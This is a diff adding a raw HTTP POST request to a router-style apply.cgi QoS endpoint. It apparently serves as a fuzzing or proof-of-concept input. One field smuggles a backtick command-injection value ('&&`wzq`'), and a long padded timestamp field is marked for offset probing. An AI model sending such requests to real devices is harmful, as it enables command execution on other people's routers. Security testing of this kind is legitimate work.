@@ -1,0 +1,5 @@
+POST /apply.cgi?plc_qos_port_edit HTTP/1.1
+Content-Type: application/json
+Content-Length: 212
+
+qos_port_priority=&&`wzq`&plc_qos_port=256&submit_flag=wlacl_apply&%20timestamp=aaaWZQaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWZQwaaaaaaaaaaaaaaaaaaaaaWZQwaaaaaaaa
